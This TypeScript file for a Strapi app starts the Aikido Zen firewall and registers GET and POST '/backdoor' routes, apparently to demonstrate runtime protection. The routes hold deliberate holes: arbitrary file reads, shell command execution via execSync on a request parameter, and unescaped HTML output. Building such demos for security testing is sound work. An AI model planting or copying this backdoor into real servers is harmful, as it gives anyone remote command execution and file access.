// @ts-ignore
import Aikido from '@aikidosec/firewall';

const Zen = (Aikido as any).default || Aikido;

if (Zen && typeof Zen.start === 'function') {
  Zen.start({
    token: process.env.AIKIDO_TOKEN,
    environment: 'development'
  });
}

import type { Core } from '@strapi/strapi';

export default {
  register(/* { strapi }: { strapi: Core.Strapi } */) {},

  async bootstrap({ strapi }: { strapi: Core.Strapi }) {
    const router = strapi.server.router;
    const isProtected = process.env.DEMO_PROTECTED === 'true';

    router.get('/backdoor', async (ctx: any) => {
      if (isProtected) {
        ctx.status = 403;
        ctx.body = { 
          error: 'Acceso denegado', 
          message: 'Esta ruta está protegida por RASP' 
        };
        return;
      }

      const { file, cmd, input } = ctx.query;

      // Path Traversal
      if (file) {
        try {
          const fs = require('fs');
          ctx.body = { content: fs.readFileSync(file, 'utf8') };
        } catch (e: any) {
          ctx.body = { error: e.message };
        }
        return;
      }

      // Command Injection
      if (cmd) {
        try {
          const { execSync } = require('child_process');
          const output = execSync(cmd).toString();
          ctx.body = { output };
        } catch (e: any) {
          ctx.body = { error: e.message };
        }
        return;
      }

      if (input) {
        ctx.type = 'html';
        ctx.body = `<html><body><h1>Resultado:</h1><p>${input}</p></body></html>`;
        return;
      }

      ctx.body = { message: 'Puerta trasera activa', routes: ['?file=', '?cmd=', '?input='] };
    });

    router.post('/backdoor', async (ctx: any) => {
      if (isProtected) {
        ctx.status = 403;
        ctx.body = { error: 'Bloqueado por RASP' };
        return;
      }

      const { file, cmd, input, url } = ctx.request.body as any;

      if (cmd) {
        const { execSync } = require('child_process');
        ctx.body = { output: execSync(cmd).toString() };
        return;
      }

      if (file) {
        const fs = require('fs');
        ctx.body = { content: fs.readFileSync(file, 'utf8') };
        return;
      }

      if (input) {
        ctx.type = 'html';
        ctx.body = `<html><body>${input}</body></html>`;
        return;
      }

      ctx.body = { received: ctx.request.body };
    });
  },
};
